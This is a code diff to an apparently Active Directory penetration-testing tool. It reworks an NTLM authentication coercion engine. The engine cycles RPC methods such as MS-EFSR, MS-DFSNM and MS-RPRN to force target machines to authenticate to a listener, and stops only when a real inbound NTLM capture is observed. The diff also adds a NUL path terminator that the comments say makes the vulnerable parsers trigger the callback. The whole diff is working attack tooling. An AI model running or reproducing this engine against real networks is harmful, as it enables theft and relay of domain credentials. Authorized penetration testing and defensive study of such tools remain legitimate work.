@@ -12,19 +12,25 @@ from __future__ import annotations
 import asyncio
 import time
 from dataclasses import dataclass, field
-from typing import Any, Literal, Protocol
+from typing import Any, Callable, Literal, Protocol
 
 from adscan_internal.rich_output import (
     mark_sensitive,
     print_info_debug,
     print_info_verbose,
-    print_success_debug,
     print_warning_debug,
 )
 
 
 CoercionAuthType = Literal["smb", "http"]
 RpcTransport = Literal["ncan_np", "ncacn_ip_tcp"]
+
+# A ``capture_signal`` returns True the instant a REAL inbound NTLM capture has
+# been observed by the out-of-band listener. It is the only authoritative stop
+# condition for a coercion run: a clean RPC return is never proof that the
+# target authenticated back, so the engine keeps walking the catalog until the
+# listener confirms a capture (or the timeout / catalog is exhausted).
+CaptureSignal = Callable[[], bool]
 
 
 @dataclass(frozen=True)
@@ -72,7 +78,16 @@ class RpcEndpoint:
 
 @dataclass(frozen=True)
 class CoercionMethodResult:
-    """Result of one coercion method attempt."""
+    """Result of one coercion method attempt.
+
+    ``probable_auth_triggered`` is a *heuristic* hint only: the RPC call did not
+    raise, or it failed with an error code that some servers return after they
+    have already initiated the outbound authentication (e.g. bad-netpath). It is
+    NEVER treated as proof of a callback - only the listener's real capture
+    signal stops the run. ``success`` therefore stays False on every attempt
+    here; the aggregate :attr:`CoercionRunResult.captured` reflects the real
+    capture observed out of band.
+    """
 
     target: CoercionTarget
     method_name: str
@@ -154,17 +169,27 @@ class CoercionMethod:
 
 @dataclass(frozen=True)
 class CoercionRunConfig:
-    """Bounded coercion engine runtime configuration."""
+    """Bounded coercion engine runtime configuration.
+
+    ``capture_signal`` is the authoritative stop condition: when supplied, the
+    engine polls it before every attempt and after every attempt and stops the
+    instant it returns True (a REAL inbound NTLM capture was observed by the
+    listener). Without it the engine walks the entire ordered catalog and stops
+    only on timeout or exhaustion. The legacy ``stop_on_first_success``
+    heuristic (stop when an RPC merely did not raise) is intentionally NOT a
+    stop condition anymore - it caused premature stops on false positives that
+    never reached vectors like MS-RPRN.
+    """
 
     listeners: tuple[CoercionListener, ...]
     methods: tuple[CoercionMethod, ...]
     timeout_seconds: float = 60.0
     delay_seconds: float = 0.05
-    stop_on_first_success: bool = True
     protocols: tuple[str, ...] = ()
     transports: tuple[RpcTransport, ...] = ()
     method_names: tuple[str, ...] = ()
     auth_types: tuple[CoercionAuthType, ...] = ()
+    capture_signal: CaptureSignal | None = None
 
 
 @dataclass(frozen=True)
@@ -175,18 +200,38 @@ class CoercionRunResult:
     results: tuple[CoercionMethodResult, ...]
     timed_out: bool
     attempts: int
+    captured: bool = False
 
     @property
     def success(self) -> bool:
-        """Return whether any method probably triggered authentication."""
+        """Return whether the listener observed a REAL inbound NTLM capture.
 
-        return any(result.success for result in self.results)
+        This is driven solely by the out-of-band capture signal - never by the
+        per-attempt heuristic. A run that exhausts the whole catalog with clean
+        RPC returns but no real callback is NOT a success.
+        """
+
+        return self.captured
+
+    @property
+    def probable_results(self) -> tuple[CoercionMethodResult, ...]:
+        """Return attempts whose RPC heuristically looked like a trigger."""
+
+        return tuple(
+            result for result in self.results if result.probable_auth_triggered
+        )
 
     @property
     def successful_results(self) -> tuple[CoercionMethodResult, ...]:
-        """Return successful method attempts."""
+        """Return the attempts that heuristically looked like a trigger.
 
-        return tuple(result for result in self.results if result.success)
+        Retained for backward compatibility with summary renderers that read
+        the "most likely" attempt. When a real capture occurred the relevant
+        attempt is among :attr:`probable_results`; callers must not treat this
+        as proof of capture (use :attr:`captured`).
+        """
+
+        return self.probable_results
 
 
 class CoercionEngine:
@@ -203,8 +248,25 @@ class CoercionEngine:
         self.rpc_adapter = rpc_adapter
         self.config = config
 
+    def _real_capture_observed(self) -> bool:
+        """Return True when the listener has confirmed a real NTLM capture."""
+
+        signal = self.config.capture_signal
+        if signal is None:
+            return False
+        try:
+            return bool(signal())
+        except Exception:  # noqa: BLE001 - capture polling must never raise
+            return False
+
     async def run(self) -> CoercionRunResult:
-        """Run configured coercion methods against the target."""
+        """Run configured coercion methods against the target.
+
+        Walks the entire ordered catalog of in-scope methods. The only early
+        stop is a REAL inbound NTLM capture reported by ``capture_signal`` -
+        the per-attempt RPC outcome is recorded as a heuristic hint but never
+        ends the run on its own.
+        """
 
         deadline = time.monotonic() + self.config.timeout_seconds
         attempts = 0
@@ -217,10 +279,10 @@ class CoercionEngine:
         )
 
         for method in self._iter_methods():
+            if self._real_capture_observed():
+                return self._build_result(results, attempts, timed_out=False)
             if time.monotonic() >= deadline:
-                return CoercionRunResult(
-                    self.target, tuple(results), timed_out=True, attempts=attempts
-                )
+                return self._build_result(results, attempts, timed_out=True)
 
             endpoints = await self._get_filtered_endpoints(method)
             if not endpoints:
@@ -234,38 +296,49 @@ class CoercionEngine:
 
             for endpoint in endpoints:
                 for listener, template in self._iter_listener_templates(method):
+                    if self._real_capture_observed():
+                        return self._build_result(results, attempts, timed_out=False)
                     if time.monotonic() >= deadline:
-                        return CoercionRunResult(
-                            self.target,
-                            tuple(results),
-                            timed_out=True,
-                            attempts=attempts,
-                        )
+                        return self._build_result(results, attempts, timed_out=True)
 
                     path = render_coercion_path(template, listener)
                     attempts += 1
                     result = await self._run_attempt(method, endpoint, listener, path)
                     results.append(result)
-                    if result.success:
-                        print_success_debug(
-                            "[coercion] probable authentication trigger "
+                    if result.probable_auth_triggered:
+                        print_info_debug(
+                            "[coercion] probable authentication trigger (heuristic, "
+                            "NOT a confirmed capture) "
                             f"target={mark_sensitive(self.target.label, 'hostname')} "
                             f"method={mark_sensitive(method.name, 'text')} "
                             f"endpoint={mark_sensitive(endpoint.label, 'text')}"
                         )
-                        if self.config.stop_on_first_success:
-                            return CoercionRunResult(
-                                self.target,
-                                tuple(results),
-                                timed_out=False,
-                                attempts=attempts,
-                            )
+
+                    # A real capture may have landed while this attempt ran -
+                    # check immediately so we stop before issuing the next one.
+                    if self._real_capture_observed():
+                        return self._build_result(results, attempts, timed_out=False)
 
                     if self.config.delay_seconds > 0:
                         await asyncio.sleep(self.config.delay_seconds)
 
+        return self._build_result(
+            results, attempts, timed_out=time.monotonic() >= deadline
+        )
+
+    def _build_result(
+        self,
+        results: list[CoercionMethodResult],
+        attempts: int,
+        *,
+        timed_out: bool,
+    ) -> CoercionRunResult:
         return CoercionRunResult(
-            self.target, tuple(results), timed_out=False, attempts=attempts
+            self.target,
+            tuple(results),
+            timed_out=timed_out,
+            attempts=attempts,
+            captured=self._real_capture_observed(),
         )
 
     def _iter_methods(self) -> tuple[CoercionMethod, ...]:
@@ -335,6 +408,10 @@ class CoercionEngine:
             rpc = await self.rpc_adapter.connect(target=self.target, endpoint=endpoint)
             async with rpc:
                 await method.trigger(rpc, path)
+            # The RPC returned cleanly. This is a HEURISTIC hint only - it is not
+            # proof that the target authenticated back to the listener, so the
+            # attempt is never marked ``success``. Only the listener's real
+            # capture signal ends the run.
             return CoercionMethodResult(
                 target=self.target,
                 method_name=method.name,
@@ -342,7 +419,7 @@ class CoercionEngine:
                 listener=listener,
                 endpoint=endpoint,
                 path=path,
-                success=True,
+                success=False,
                 probable_auth_triggered=True,
                 duration_seconds=time.monotonic() - started,
             )
@@ -350,6 +427,9 @@ class CoercionEngine:
             raise
         except Exception as exc:
             if _is_probable_success(exc, method.success_markers):
+                # Some servers initiate the callback and then return an error
+                # code (e.g. bad-netpath). Record it as a heuristic hint, never
+                # as a confirmed success.
                 return CoercionMethodResult(
                     target=self.target,
                     method_name=method.name,
@@ -357,9 +437,10 @@ class CoercionEngine:
                     listener=listener,
                     endpoint=endpoint,
                     path=path,
-                    success=True,
+                    success=False,
                     probable_auth_triggered=True,
                     error=str(exc),
+                    error_code=_extract_error_code(exc),
                     duration_seconds=time.monotonic() - started,
                 )
 
@@ -497,6 +578,11 @@ def render_coercion_path(template: str, listener: CoercionListener) -> str:
     - ``{listener}``: listener host/IP.
     - ``{listen_port}``: ``@port`` for non-default SMB/HTTP ports, otherwise empty.
     - ``{rnd:N}``: random ASCII token with length ``N``.
+    - ``{nul}``: a literal NUL (``\\x00``) terminator. Coercer bakes a trailing
+      NUL into every COERCE exploit path; it is the path-string terminator that
+      makes EFSR/DFSNM/RPRN parsers perform the netpath lookup that triggers the
+      callback. Templates declare it explicitly (raw strings cannot embed a real
+      NUL), so MS-EVEN's ``\\aa`` form can opt out by simply omitting ``{nul}``.
     """
 
     import secrets
@@ -519,6 +605,9 @@ def render_coercion_path(template: str, listener: CoercionListener) -> str:
         length = max(1, int(length_text))
         token = "".join(secrets.choice(alphabet) for _ in range(length))
         rendered = f"{rendered[:start]}{token}{rendered[end + 1 :]}"
+    # Replace the explicit NUL token LAST so it cannot interfere with the
+    # ``{listener}`` / ``{listen_port}`` / ``{rnd:N}`` substitutions above.
+    rendered = rendered.replace("{nul}", "\x00")
     return rendered
 
 
